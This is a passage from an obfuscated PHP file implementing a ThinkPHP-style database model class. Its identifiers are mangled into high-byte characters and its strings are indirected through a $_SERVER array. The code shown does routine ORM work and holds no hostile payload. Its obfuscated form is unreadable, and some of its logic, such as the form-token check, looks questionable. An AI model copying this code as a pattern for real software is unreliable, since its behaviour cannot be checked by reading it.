$_SERVER[”ôÑ§ì¸]; $this->_initialize(); if (!empty($•é©†)) { if (strpos($•é©†, $”ˆ½Ÿ½†[10])) { list($this->dbName, $this->name) = explode($”ˆ½Ÿ½†[10], $•é©†); } else { $this->name = $•é©†; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($€ç¬ƒòç)) { $this->tablePrefix = $”ˆ½Ÿ½†[12]; } elseif ($”ˆ½Ÿ½†[12] != $€ç¬ƒòç) { $this->tablePrefix = $€ç¬ƒòç; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($”ˆ½Ÿ½†[287]); } $this->db(0, empty($this->connection) ? $—Šµ™•Œ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÌİëØ§Î =& $_SERVER[”ôÑ§ì¸]; if (empty($this->fields)) { if (think_config($ÌİëØ§Î[288])) { $º×€£¸ = $this->dbName ? $this->dbName : think_config($ÌİëØ§Î[289]); $Æ½şÜŸ = think_var_cache($ÌİëØ§Î[290] . strtolower(get_path_this($º×€£¸) . $ÌİëØ§Î[10] . $this->name)); if ($Æ½şÜŸ) { $•°«ÍáÍ = think_config($ÌİëØ§Î[291]); if (empty($•°«ÍáÍ) || $Æ½şÜŸ[$ÌİëØ§Î[292]] == $•°«ÍáÍ) { $this->fields = $Æ½şÜŸ; return; } } } $this->flush(); } } public function flush() { $‹Íìı½Ê =& $_SERVER[”ôÑ§ì¸]; $this->db->setModel($this->name); $Ê¥ÙÃöÒ = $this->db->getFields($this->getTableName()); if (!$Ê¥ÙÃöÒ) { return !1; } $this->fields = array_keys($Ê¥ÙÃöÒ); $this->fields[$‹Íìı½Ê[293]] = !1; foreach ($Ê¥ÙÃöÒ as $ÆÅ®×îÆ => $î³Èíˆœ) { $¯”Ûë‰€[$ÆÅ®×îÆ] = $î³Èíˆœ[$‹Íìı½Ê[33]]; if ($î³Èíˆœ[$‹Íìı½Ê[39]]) { $this->fields[$‹Íìı½Ê[294]] = $ÆÅ®×îÆ; if ($î³Èíˆœ[$‹Íìı½Ê[42]]) { $this->fields[$‹Íìı½Ê[293]] = !0; } } } $this->fields[$‹Íìı½Ê[295]] = $¯”Ûë‰€; if (think_config($‹Íìı½Ê[291])) { $this->fields[$‹Íìı½Ê[292]] = think_config($‹Íìı½Ê[291]); } if (think_config($‹Íìı½Ê[288])) { $ú·í™á = $this->dbName ? $this->dbName : think_config($‹Íìı½Ê[289]); think_var_cache($‹Íìı½Ê[290] . strtolower(get_path_this($ú·í™á) . $‹Íìı½Ê[10] . $this->name), $this->fields); } } public function switchModel($Å‚Œ»Èö, $×ˆïßáú = array()) { $‡±ú‰ù‰ =& $_SERVER[”ôÑ§ì¸]; $ÖÀ£““Ü = ucwords(strtolower($Å‚Œ»Èö)) . $‡±ú‰ù‰[296]; if (!class_exists($ÖÀ£““Ü)) { think_exception($ÖÀ£““Ü . think_lang($‡±ú‰ù‰[297])); } $this->_extModel = new $ÖÀ£““Ü($this->name); if (!empty($×ˆïßáú)) { foreach ($×ˆïßáú as $¬¾¤â) { $this->_extModel->setProperty($¬¾¤â, $this->{$¬¾¤â}); } } return $this->_extModel; } public function __set($®ëÊéñı, $‘©ÒÇŞõ) { $this->data[$®ëÊéñı] = $‘©ÒÇŞõ; } public function __get($¬ÃØ¼ä„) { return isset($this->data[$¬ÃØ¼ä„]) ? $this->data[$¬ÃØ¼ä„] : null; } public function __isset($óè­¶¨±) { return isset($this->data[$óè­¶¨±]); } public function __unset($ìè¸¬Î) { unset($this->data[$ìè¸¬Î]); } public function __call($¦™ÉÔÈ, $ïº†õô«) { $Õı‡©Òå =& $_SERVER[”ôÑ§ì¸]; if (in_array(strtolower($¦™ÉÔÈ), $this->methods, !0)) { $this->options[strtolower($¦™ÉÔÈ)] = $ïº†õô«[0]; return $this; } elseif (in_array(strtolower($¦™ÉÔÈ), array($Õı‡©Òå[298], $Õı‡©Òå[299], $Õı‡©Òå[300], $Õı‡©Òå[301], $Õı‡©Òå[302]), !0)) { $·áã¿ìò = isset($ïº†õô«[0]) ? $ïº†õô«[0] : $Õı‡©Òå[202]; $·áã¿ìò = $this->db->parseKey($·áã¿ìò); return $this->getField(strtoupper($¦™ÉÔÈ) . $Õı‡©Òå[303] . $·áã¿ìò . $Õı‡©Òå[304] . $¦™ÉÔÈ, $Õı‡©Òå[298]); } elseif (strtolower(substr($¦™ÉÔÈ, 0, 5)) == $Õı‡©Òå[305]) { $·áã¿ìò = think_parse_name(substr($¦™ÉÔÈ, 5)); $µĞŸåÏ¦[$·áã¿ìò] = $ïº†õô«[0]; return $this->where($µĞŸåÏ¦)->find(); } elseif (strtolower(substr($¦™ÉÔÈ, 0, 10)) == $Õı‡©Òå[306]) { $Å²’¯Å¼ = think_parse_name(substr($¦™ÉÔÈ, 10)); $µĞŸåÏ¦[$Å²’¯Å¼] = $ïº†õô«[0]; return $this->where($µĞŸåÏ¦)->getField($ïº†õô«[1]); } elseif (isset($this->_scope[$¦™ÉÔÈ])) { return $this->scope($¦™ÉÔÈ, $ïº†õô«[0]); } elseif (method_exists($this, $¦™ÉÔÈ)) { array_unshift($ïº†õô«, $¦™ÉÔÈ); return call_user_func_array(array($this, $Õı‡©Òå[307]), $ïº†õô«); } else { return call_user_func_array(array(parent, $¦™ÉÔÈ), $ïº†õô«); } } protected function call() { $úÈ©ß– =& $_SERVER[”ôÑ§ì¸]; $™ˆ´ö·‘ = func_get_args(); $˜™İõ‚§ = array_shift($™ˆ´ö·‘); $ˆ¯åÊí = $˜™İõ‚§; if (is_array($˜™İõ‚§)) { $ˆ¯åÊí = $˜™İõ‚§[1]; $˜™İõ‚§ = $˜™İõ‚§[0]; } $Çî´‹ì‹ = count($™ˆ´ö·‘) - 1; if (isset($™ˆ´ö·‘[$Çî´‹ì‹]) && $™ˆ´ö·‘[$Çî´‹ì‹] === $˜™İõ‚§) { think_exception(__CLASS__ . $úÈ©ß–[4] . $˜™İõ‚§ . think_lang($úÈ©ß–[308])); return; } $™ˆ´ö·‘[] = $˜™İõ‚§; if (method_exists($this, $úÈ©ß–[309])) { $Ş—š„¢ = call_user_func_array(array($this, $úÈ©ß–[310]), array($ˆ¯åÊí, $™ˆ´ö·‘)); if (!is_null($Ş—š„¢) && $Ş—š„¢ !== !1) { return $Ş—š„¢; } } $­²ÎæõÅ = call_user_func_array(array($this, $˜™İõ‚§), $™ˆ´ö·‘); if (method_exists($this, $úÈ©ß–[311])) { $Ş—š„¢ = call_user_func_array(array($this, $úÈ©ß–[312]), array($ˆ¯åÊí, $™ˆ´ö·‘, $­²ÎæõÅ)); if ($Ş—š„¢) { return $Ş—š„¢; } } return $­²ÎæõÅ; } protected function _initialize() { } protected function _facade($”Ş¯ßıÍ) { $Â’®ÜğŸ =& $_SERVER[”ôÑ§ì¸]; if (!empty($this->fields)) { foreach ($”Ş¯ßıÍ as $œ´Ó·£ => $”ó¡î ä) { if (is_array($this->fields) && !in_array($œ´Ó·£, $this->fields, !0)) { unset($”Ş¯ßıÍ[$œ´Ó·£]); } elseif (is_scalar($”ó¡î ä)) { $this->_parseType($”Ş¯ßıÍ, $œ´Ó·£); } } } if (!empty($this->options[$Â’®ÜğŸ[313]])) { $”Ş¯ßıÍ = array_map($this->options[$Â’®ÜğŸ[313]], $”Ş¯ßıÍ); unset($this->options[$Â’®ÜğŸ[313]]); } $this->_beforeWrite($”Ş¯ßıÍ); return $”Ş¯ßıÍ; } protected function _beforeWrite(&$Ÿ‹æÄô†) { } public function add($±È°Ï£ = '', $İê×Ñ = array(), $ë í»É = false) { if (empty($±È°Ï£)) { if (!empty($this->data)) { $±È°Ï£ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[”ôÑ§ì¸][314]); return !1; } } $İê×Ñ = $this->_parseOptions($İê×Ñ); $±È°Ï£ = $this->_facade($±È°Ï£); if (!1 === $this->_beforeInsert($±È°Ï£, $İê×Ñ)) { return !1; } $êŠùÊ—æ = $this->db->insert($±È°Ï£, $İê×Ñ, $ë í»É); if (!1 !== $êŠùÊ—æ) { $ŸÆª¯í = $this->getLastInsID(); if ($ŸÆª¯í) { $±È°Ï£[$this->getPk()] = $ŸÆª¯í; $this->_after_insert($±È°Ï£, $İê×Ñ); return $ŸÆª¯í; } $this->_after_insert($±È°Ï£, $İê×Ñ); } return $êŠùÊ—æ; } protected function _beforeInsert(&$èçÁ‘æÛ, $¤ªÏ–¢ì) { } protected function _after_insert($ÄšúÉ, $®Ë¢¥Ñû) { } public function addAll($ÁÙœ½ı°, $ÒÎÃãÒß = array(), $ˆÚâĞÅ™ = false) { $Äö§„ıò =& $_SERVER[”ôÑ§ì¸]; if (empty($ÁÙœ½ı°)) { $this->error = think_lang($Äö§„ıò[314]); return !1; } $ÒÎÃãÒß = $this->_parseOptions($ÒÎÃãÒß); foreach ($ÁÙœ½ı° as $ìĞğ®Ì => $„©õ‚‚Ç) { $ÁÙœ½ı°[$ìĞğ®Ì] = $this->_facade($„©õ‚‚Ç); } if (method_exists($this->db, $Äö§„ıò[315])) { $ıı¯â«© = $this->db->insertAll($ÁÙœ½ı°, $ÒÎÃãÒß, $ˆÚâĞÅ™); } else { $this->startTrans(); foreach ($ÁÙœ½ı° as $ìĞğ®Ì => $„©õ‚‚Ç) { $ıı¯â«© = $this->db->insert($„©õ‚‚Ç, $ÒÎÃãÒß, $ˆÚâĞÅ™); } $this->commit(); } if (!1 !== $ıı¯â«©) { $Ú¢ş«šÁ = $this->getLastInsID(); if ($Ú¢ş«šÁ) { return $Ú¢ş«šÁ; } } return $ıı¯â«©; } public function selectAdd($àîæ°¹ß = '', $—½µ‹½ü = '', $îï‰„ñĞ = array()) { $¯ß£Û¹Ø =& $_SERVER[”ôÑ§ì¸]; $îï‰„ñĞ = $this->_parseOptions($îï‰„ñĞ); if (!1 === ($Í®ö„„Å = $this->db->selectInsert($àîæ°¹ß ? $àîæ°¹ß : $îï‰„ñĞ[$¯ß£Û¹Ø[316]], $—½µ‹½ü ? $—½µ‹½ü : $this->getTableName(), $îï‰„ñĞ))) { $this->error = think_lang($¯ß£Û¹Ø[317]); return !1; } else { return $Í®ö„„Å; } } public function save($Ò‰Ş–ş± = '', $ÍÓ·ÎÀ = array()) { $¯Ó©»ëÑ =& $_SERVER[”ôÑ§ì¸]; if (empty($Ò‰Ş–ş±)) { if (!empty($this->data)) { $Ò‰Ş–ş± = $this->data; $this->data = array(); } else { $this->error = think_lang($¯Ó©»ëÑ[314]); return !1; } } $Ò‰Ş–ş± = $this->_facade($Ò‰Ş–ş±); $ÍÓ·ÎÀ = $this->_parseOptions($ÍÓ·ÎÀ); $®’Ùº‡ = $this->getPk(); if (!isset($ÍÓ·ÎÀ[$¯Ó©»ëÑ[318]])) { if (isset($Ò‰Ş–ş±[$®’Ùº‡])) { $Æšî’´Û[$®’Ùº‡] = $Ò‰Ş–ş±[$®’Ùº‡]; $ÍÓ·ÎÀ[$¯Ó©»ëÑ[318]] = $Æšî’´Û; unset($Ò‰Ş–ş±[$®’Ùº‡]); } else { $this->error = think_lang($¯Ó©»ëÑ[317]); return !1; } } if (is_array($ÍÓ·ÎÀ[$¯Ó©»ëÑ[318]]) && isset($ÍÓ·ÎÀ[$¯Ó©»ëÑ[318]][$®’Ùº‡])) { $¬«ğ™â² = $ÍÓ·ÎÀ[$¯Ó©»ëÑ[318]][$®’Ùº‡]; } if (!1 === $this->_beforeUpdate($Ò‰Ş–ş±, $ÍÓ·ÎÀ)) { return !1; } $Ğ”ˆ„ıõ = $this->db->update($Ò‰Ş–ş±, $ÍÓ·ÎÀ); if (!1 !== $Ğ”ˆ„ıõ) { if (isset($¬«ğ™â²)) { $Ò‰Ş–ş±[$®’Ùº‡] = $¬«ğ™â²; } $this->_afterUpdate($Ò‰Ş–ş±, $ÍÓ·ÎÀ); } return $Ğ”ˆ„ıõ; } protected function _beforeUpdate(&$¹É³µâ, $ íç×•³) { } protected function _afterUpdate($†·ú­„­, $Š¼Î«íÂ) { } public function delete($È¨ÀĞº = array()) { $šöÔ’Ğ¦ =& $_SERVER[”ôÑ§ì¸]; if (empty($È¨ÀĞº) && empty($this->options[$šöÔ’Ğ¦[318]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ïòà³Ô† = $this->getPk(); if (is_numeric($È¨ÀĞº) || is_string($È¨ÀĞº)) { if (strpos($È¨ÀĞº, $šöÔ’Ğ¦[50])) { $ßÓöíë[$ïòà³Ô†] = array($šöÔ’Ğ¦[319], $È¨ÀĞº); } else { $ßÓöíë[$ïòà³Ô†] = $È¨ÀĞº; } $this->options[$šöÔ’Ğ¦[318]] = $ßÓöíë; } $È¨ÀĞº = $this->_parseOptions(); if (is_array($È¨ÀĞº[$šöÔ’Ğ¦[318]]) && isset($È¨ÀĞº[$šöÔ’Ğ¦[318]][$ïòà³Ô†])) { $ú€ öˆ¹ = $È¨ÀĞº[$šöÔ’Ğ¦[318]][$ïòà³Ô†]; } $¶Ò²ÌÁ¬ = $this->db->delete($È¨ÀĞº); if (!1 !== $¶Ò²ÌÁ¬) { $ôèÍó = array(); if (isset($ú€ öˆ¹)) { $ôèÍó[$ïòà³Ô†] = $ú€ öˆ¹; } $this->_after_delete($ôèÍó, $È¨ÀĞº); } return $¶Ò²ÌÁ¬; } protected function _after_delete($¾öŸŸô›, $ûä–Œ¸ö) { } public function select($ì•¡’‰² = array()) { $˜ÇÃ‹Õ =& $_SERVER[”ôÑ§ì¸]; if (is_string($ì•¡’‰²) || is_numeric($ì•¡’‰²)) { $œ°Îê¬² = $this->getPk(); if (strpos($ì•¡’‰², $˜ÇÃ‹Õ[50])) { $›ºçßÂĞ[$œ°Îê¬²] = array($˜ÇÃ‹Õ[319], $ì•¡’‰²); } else { $›ºçßÂĞ[$œ°Îê¬²] = $ì•¡’‰²; } $this->options[$˜ÇÃ‹Õ[318]] = $›ºçßÂĞ; } elseif (!1 === $ì•¡’‰²) { $ì•¡’‰² = $this->_parseOptions(); return $˜ÇÃ‹Õ[320] . $this->db->buildSelectSql($ì•¡’‰²) . $˜ÇÃ‹Õ[321]; } $ì•¡’‰² = $this->_parseOptions(); $ÈÅ„º”Ï = $this->db->select($ì•¡’‰²); if (!1 === $ÈÅ„º”Ï) { return !1; } if (empty($ÈÅ„º”Ï)) { return null; } $this->_afterSelect($ÈÅ„º”Ï, $ì•¡’‰²); return $ÈÅ„º”Ï; } protected function _afterSelect(&$·ĞÅ»ŸË, $ã¶íÑ¬š) { } public function buildSql($æÂö¢†  = array()) { $ãäÌé®¯ =& $_SERVER[”ôÑ§ì¸]; $æÂö¢†  = $this->_parseOptions($æÂö¢† ); return $ãäÌé®¯[320] . $this->db->buildSelectSql($æÂö¢† ) . $ãäÌé®¯[321]; } public function optionsValue($ıã¸ŒàÈ = null) { if (is_null($ıã¸ŒàÈ)) { return $this->options; } elseif (is_array($ıã¸ŒàÈ)) { $this->options = array_merge($this->options, $ıã¸ŒàÈ); } } protected function _parseOptions($›Ôßµ³‰ = array()) { $“ñç¦– =& $_SERVER[”ôÑ§ì¸]; if (is_array($›Ôßµ³‰)) { $›Ôßµ³‰ = array_merge($this->options, $›Ôßµ³‰); } $this->options = array(); if (!isset($›Ôßµ³‰[$“ñç¦–[322]])) { $›Ôßµ³‰[$“ñç¦–[322]] = $this->getTableName(); $¿½®· = $this->fields; } else { $¿½®· = $this->getDbFields(); } if (!empty($›Ôßµ³‰[$“ñç¦–[323]])) { $›Ôßµ³‰[$“ñç¦–[322]] .= $“ñç¦–[53] . $›Ôßµ³‰[$“ñç¦–[323]]; } $›Ôßµ³‰[$“ñç¦–[324]] = $this->name; if (isset($›Ôßµ³‰[$“ñç¦–[318]]) && is_array($›Ôßµ³‰[$“ñç¦–[318]]) && !empty($¿½®·) && !isset($›Ôßµ³‰[$“ñç¦–[325]]) && !isset($›Ôßµ³‰[$“ñç¦–[322]])) { foreach ($›Ôßµ³‰[$“ñç¦–[318]] as $€ı¿­ñÊ => $ÏÙÒ¥ƒ) { $€ı¿­ñÊ = trim($€ı¿­ñÊ); if (in_array($€ı¿­ñÊ, $¿½®·, !0)) { if (is_scalar($ÏÙÒ¥ƒ)) { $this->_parseType($›Ôßµ³‰[$“ñç¦–[318]], $€ı¿­ñÊ); } } elseif (!is_numeric($€ı¿­ñÊ) && $“ñç¦–[11] != substr($€ı¿­ñÊ, 0, 1) && !1 === strpos($€ı¿­ñÊ, $“ñç¦–[10]) && !1 === strpos($€ı¿­ñÊ, $“ñç¦–[303]) && !1 === strpos($€ı¿­ñÊ, $“ñç¦–[326]) && !1 === strpos($€ı¿­ñÊ, $“ñç¦–[327])) { unset($›Ôßµ³‰[$“ñç¦–[318]][$€ı¿­ñÊ]); } } } $this->_options_filter($›Ôßµ³‰); return $›Ôßµ³‰; } protected function _options_filter(&$½¯–à§) { } protected function _parseType(&$°Æ±õ®†, $Ø¹­à­”) { $ğúİàô =& $_SERVER[”ôÑ§ì¸]; if (empty($this->options[$ğúİàô[328]][$ğúİàô[4] . $Ø¹­à­”])) { $ÆªíÔÙ™ = strtolower($this->fields[$ğúİàô[295]][$Ø¹­à­”]); if (!1 !== strpos($ÆªíÔÙ™, $ğúİàô[329])) { } elseif (!1 === strpos($ÆªíÔÙ™, $ğúİàô[330]) && !1 !== strpos($ÆªíÔÙ™, $ğúİàô[331])) { $°Æ±õ®†[$Ø¹­à­”] = intval($°Æ±õ®†[$Ø¹­à­”]); } elseif (!1 !== strpos($ÆªíÔÙ™, $ğúİàô[332]) || !1 !== strpos($ÆªíÔÙ™, $ğúİàô[333])) { $°Æ±õ®†[$Ø¹­à­”] = floatval($°Æ±õ®†[$Ø¹­à­”]); } elseif (!1 !== strpos($ÆªíÔÙ™, $ğúİàô[334])) { $°Æ±õ®†[$Ø¹­à­”] = (bool) $°Æ±õ®†[$Ø¹­à­”]; } } } public function find($óìáºü‰ = array()) { $õºîÌÉ  =& $_SERVER[”ôÑ§ì¸]; if (is_numeric($óìáºü‰) || is_string($óìáºü‰)) { $­ºÒ­Âé[$this->getPk()] = intval($óìáºü‰); $this->options[$õºîÌÉ [318]] = $­ºÒ­Âé; } $this->options[$õºîÌÉ [335]] = 1; $óìáºü‰ = $this->_parseOptions(); $·²„¿ÏŞ = $this->db->select($óìáºü‰); if (!1 === $·²„¿ÏŞ) { return !1; } if (empty($·²„¿ÏŞ)) { return null; } $this->data = $·²„¿ÏŞ[0]; $this->_afterFind($this->data, $óìáºü‰); if (!empty($this->options[$õºîÌÉ [336]])) { return $this->returnResult($this->data, $this->options[$õºîÌÉ [336]]); } return $this->data; } protected function _afterFind(&$·Æ¥äåÂ, $ì¹Ö² Ó) { } protected function returnResult($íºÉ—Â¾, $Úàîà†È = '') { $·±šÅè± =& $_SERVER[”ôÑ§ì¸]; if ($Úàîà†È) { if (is_callable($Úàîà†È)) { return call_user_func($Úàîà†È, $íºÉ—Â¾); } switch (strtolower($Úàîà†È)) { case $·±šÅè±[337]: return json_encode($íºÉ—Â¾); case $·±šÅè±[338]: return xml_encode($íºÉ—Â¾); } } return $íºÉ—Â¾; } public function parseFieldsMap($Û¨…ø¢Î, $Ø´ˆ®ô¾ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $€Í¬ => $‰íáÔĞÏ) { if ($Ø´ˆ®ô¾ == 1) { if (isset($Û¨…ø¢Î[$‰íáÔĞÏ])) { $Û¨…ø¢Î[$€Í¬] = $Û¨…ø¢Î[$‰íáÔĞÏ]; unset($Û¨…ø¢Î[$‰íáÔĞÏ]); } } else { if (isset($Û¨…ø¢Î[$€Í¬])) { $Û¨…ø¢Î[$‰íáÔĞÏ] = $Û¨…ø¢Î[$€Í¬]; unset($Û¨…ø¢Î[$€Í¬]); } } } } return $Û¨…ø¢Î; } public function setField($½ÖŒµ½¨, $¹í‘úœş = '') { if (is_array($½ÖŒµ½¨)) { $¿‹µ²ˆ = $½ÖŒµ½¨; } else { $¿‹µ²ˆ[$½ÖŒµ½¨] = $¹í‘úœş; } return $this->save($¿‹µ²ˆ); } public function setAdd($èõØº®, $ğß‹ŸÏö = 1) { $–¥”ïÕü =& $_SERVER[”ôÑ§ì¸]; $„‘äñÜº = $èõØº® . $–¥”ïÕü[339] . $ğß‹ŸÏö; if ($ğß‹ŸÏö < 0) { $„‘äñÜº = $èõØº® . $ğß‹ŸÏö; } return $this->setField($èõØº®, array($–¥”ïÕü[340], $„‘äñÜº)); } public function getField($€Ú±ªÛü, $ƒÂƒØşó = null) { $Š¾ÑÊÛÁ =& $_SERVER[”ôÑ§ì¸]; $¤–¹Ğğ‹[$Š¾ÑÊÛÁ[316]] = $€Ú±ªÛü; $¤–¹Ğğ‹ = $this->_parseOptions($¤–¹Ğğ‹); $€Ú±ªÛü = trim($€Ú±ªÛü); if (strpos($€Ú±ªÛü, $Š¾ÑÊÛÁ[50])) { if (!isset($¤–¹Ğğ‹[$Š¾ÑÊÛÁ[335]])) { $¤–¹Ğğ‹[$Š¾ÑÊÛÁ[335]] = is_numeric($ƒÂƒØşó) ? $ƒÂƒØşó : $Š¾ÑÊÛÁ[12]; } $„ÖÌ¿ß÷ = $this->db->select($¤–¹Ğğ‹); if (!empty($„ÖÌ¿ß÷)) { $ŞÍäô¬§ = explode($Š¾ÑÊÛÁ[50], $€Ú±ªÛü); $€Ú±ªÛü = array_keys($„ÖÌ¿ß÷[0]); $ÅŒ„æÇª = array_shift($€Ú±ªÛü); $‚ııÜ = array_shift($€Ú±ªÛü); $×÷øìÆú = array(); $¯¶Íşğ¯ = count($ŞÍäô¬§); foreach ($„ÖÌ¿ß÷ as $©¾ç¼Åˆ) { $‘œÌ˜õè = $©¾ç¼Åˆ[$ÅŒ„æÇª]; if (2 == $¯¶Íşğ¯) { $×÷øìÆú[$‘œÌ˜õè] = $©¾ç¼Åˆ[$‚ııÜ]; } else { $×÷øìÆú[$‘œÌ˜õè] = is_string($ƒÂƒØşó) ? implode($ƒÂƒØşó, $©¾ç¼Åˆ) : $©¾ç¼Åˆ; } } return $×÷øìÆú; } } else { if (!0 !== $ƒÂƒØşó) { $¤–¹Ğğ‹[$Š¾ÑÊÛÁ[335]] = is_numeric($ƒÂƒØşó) ? $ƒÂƒØşó : 1; } if ($ƒÂƒØşó === $Š¾ÑÊÛÁ[298]) { unset($¤–¹Ğğ‹[$Š¾ÑÊÛÁ[335]]); } $©¾ç¼Åˆ = $this->db->select($¤–¹Ğğ‹); if (!empty($©¾ç¼Åˆ)) { if ($ƒÂƒØşó === $Š¾ÑÊÛÁ[298]) { return reset($©¾ç¼Åˆ[0]); } if (!0 !== $ƒÂƒØşó && 1 == $¤–¹Ğğ‹[$Š¾ÑÊÛÁ[335]]) { return reset($©¾ç¼Åˆ[0]); } foreach ($©¾ç¼Åˆ as $£ÖÈ¢Ù) { $ÏÉàÉ‘’[] = $£ÖÈ¢Ù[$€Ú±ªÛü]; } return $ÏÉàÉ‘’; } } return null; } public function create($§„¯È‹£ = '', $‘¯›æã = '') { $â¨ï¼ÄÂ =& $_SERVER[”ôÑ§ì¸]; if (empty($§„¯È‹£)) { $§„¯È‹£ = $_POST; } elseif (is_object($§„¯È‹£)) { $§„¯È‹£ = get_object_vars($§„¯È‹£); } if (empty($§„¯È‹£) || !is_array($§„¯È‹£)) { $this->error = think_lang($â¨ï¼ÄÂ[314]); return !1; } $§„¯È‹£ = $this->parseFieldsMap($§„¯È‹£, 0); $‘¯›æã = $‘¯›æã ? $‘¯›æã : (!empty($§„¯È‹£[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$â¨ï¼ÄÂ[316]])) { $•Û¥Æ³– = $this->options[$â¨ï¼ÄÂ[316]]; unset($this->options[$â¨ï¼ÄÂ[316]]); } elseif ($‘¯›æã == THINK_MODEL_INSERT && isset($this->insertFields)) { $•Û¥Æ³– = $this->insertFields; } elseif ($‘¯›æã == THINK_MODEL_UPDATE && isset($this->updateFields)) { $•Û¥Æ³– = $this->updateFields; } if (isset($•Û¥Æ³–)) { if (is_string($•Û¥Æ³–)) { $•Û¥Æ³– = explode($â¨ï¼ÄÂ[50], $•Û¥Æ³–); } if (think_config($â¨ï¼ÄÂ[341])) { $•Û¥Æ³–[] = think_config($â¨ï¼ÄÂ[342]); } foreach ($§„¯È‹£ as $•ÛÓéÆÓ => $ªù´ÓÓ) { if (!in_array($•ÛÓéÆÓ, $•Û¥Æ³–)) { unset($§„¯È‹£[$•ÛÓéÆÓ]); } } } if (!$this->autoValidation($§„¯È‹£, $‘¯›æã)) { return !1; } if (!$this->autoCheckToken($§„¯È‹£)) { $this->error = think_lang($â¨ï¼ÄÂ[343]); return !1; } if ($this->autoCheckFields) { $•Û¥Æ³– = $this->getDbFields(); foreach ($§„¯È‹£ as $•ÛÓéÆÓ => $ªù´ÓÓ) { if (!in_array($•ÛÓéÆÓ, $•Û¥Æ³–)) { unset($§„¯È‹£[$•ÛÓéÆÓ]); } elseif (MAGIC_QUOTES_GPC && is_string($ªù´ÓÓ)) { $§„¯È‹£[$•ÛÓéÆÓ] = stripslashes($ªù´ÓÓ); } } } $this->autoOperation($§„¯È‹£, $‘¯›æã); $this->data = $§„¯È‹£; return $§„¯È‹£; } public function autoCheckToken($ÓùÙ»ŠÛ) { $Ğ ÷ä” =& $_SERVER[”ôÑ§ì¸]; if (isset($this->options[$Ğ ÷ä”[344]]) && !$this->options[$Ğ ÷ä”[344]]) { return !0; } if (think_config($Ğ ÷ä”[341])) { $Ú°ÛÍ®¶ = think_config($Ğ ÷ä”[342]); if (!isset($ÓùÙ»ŠÛ[$Ú°ÛÍ®¶]) || Session::get($Ú°ÛÍ®¶)) { return !1; } list($¦¤¦¢Ö‰, $õ§İŞº´) = explode($Ğ ÷ä”[11], $ÓùÙ»ŠÛ[$Ú°ÛÍ®¶]); if ($õ§İŞº´ && Session::get($Ú°ÛÍ®¶ . $Ğ ÷ä”[10] . $¦¤¦¢Ö‰) === $õ§İŞº´) { Session::remove($Ú°ÛÍ®¶ . $Ğ ÷ä”[10] . $¦¤¦¢Ö‰); return !0; } if (think_config($Ğ ÷ä”[345])) { Session::remove($Ú°ÛÍ®¶ . $Ğ ÷ä”[10] . $¦¤¦¢Ö‰); } return !1; } return !0; } public function regex($¹‘ÊÉş°, $š„ğæÍ¡) { $ïü€Ä˜£ =& $_SERVER[”ôÑ§ì¸]; $À„ –­æ = array($ïü€Ä˜£[346] => $ïü€Ä˜£[347], $ïü€Ä˜£[348] => $ïü€Ä˜£[349], $ïü€Ä˜£[350] => $ïü€Ä˜£[351], $ïü€Ä˜£[352] => $ïü€Ä˜£[353], $ïü€Ä˜£[354] => $ïü€Ä˜£[355], $ïü€Ä˜£[356] => $ïü€Ä˜£[357], $ïü€Ä˜£[358] => $ïü€Ä˜£[359], $ïü€Ä˜£[333] => $ïü€Ä˜£[360], $ïü€Ä˜£[361] => $ïü€Ä˜£[362]); if (isset($À„ –­æ[strtolower($š„ğæÍ¡)])) { $š„ğæÍ¡ = $À„ –­æ[strtolower($š„ğæÍ¡)]; } return preg_match($š„ğæÍ¡, $¹‘ÊÉş°) === 1; } private function autoOperation(&$àîñâ¬¥, $ºÌşòˆ…) { $›üÃ“• =& $_SERVER[”ôÑ§ì¸]; if (!empty($this->options[$›üÃ“•[363]])) { $••÷ˆì’ = $this->options[$›üÃ“•[363]]; unset($this->options[$›üÃ“•[363]]); } elseif (!empty($this->_auto)) { $••÷ˆì’ = $this->_auto; } if (isset($••÷ˆì’)) { foreach ($••÷ˆì’ as $‚À—Î) { if (empty($‚À—Î[2])) { $‚À—Î[2] = THINK_MODEL_INSERT; } if ($ºÌşòˆ… == $‚À—Î[2] || $‚À—Î[2] == THINK_MODEL_BOTH) { switch (trim($‚À—Î[3])) { case $›üÃ“•[364]: case $›üÃ“•[365]: $½¾‚•³„ = isset($‚À—Î[4]) ? (array) $‚À—Î[4] : array(); if (isset($àîñâ¬¥[$‚À—Î[0]])) { array_unshift($½¾‚•³„, $àîñâ¬¥[$‚À—Î[0]]); } if ($›üÃ“•[364] == $‚À—Î[3]) { $àîñâ¬¥[$‚À—Î[0]] = call_user_func_array($‚À—Î[1], $½¾‚•³„); } else { $àîñâ¬¥[$‚À—Î[0]] = call_user_func_array(array(&$this, $‚À—Î[1]), $½¾‚•³„); } break; case $›üÃ“•[316]: $àîñâ¬¥[$‚À—Î[0]] = $àîñâ¬¥[$‚À—Î[1]]; break; case $›üÃ“•[366]: if ($›üÃ“•[12] === $àîñâ¬¥[$‚À—Î[0]]) { unset($àîñâ¬¥[$‚À—Î[0]]); } break; case $›üÃ“•[367]: default: $àîñâ¬¥[$‚À—Î[0]] = $‚À—Î[1]; } if (!1 === $àîñâ¬¥[$‚À—Î[0]]) { unset($àîñâ¬¥[$‚À—Î[0]]); } } } } return $àîñâ¬¥; } protected function autoValidation($Óƒù‹¦è, $şÊ„ùó’) { $«¶›ó€ =& $_SERVER[”ôÑ§ì¸]; if (!empty($this->options[$«¶›ó€[368]])) { $¼ïó½ Û = $this->options[$«¶›ó€[368]]; unset($this->options[$«¶›ó€[368]]); } elseif (!empty($this->_validate)) { $¼ïó½ Û = $this->_validate; } if (isset($¼ïó½ Û)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¼ïó½ Û as $Ç®í«ûŸ => $†²¿¸àä) { if (empty($†²¿¸àä[5]) || $†²¿¸àä[5] == THINK_MODEL_BOTH || $†²¿¸àä[5] == $şÊ„ùó’) { if (0 == strpos($†²¿¸àä[2], $«¶›ó€[369]) && strpos($†²¿¸àä[2], $«¶›ó€[370])) { $†²¿¸àä[2] = think_lang(substr($†²¿¸àä[2], 2, -1)); 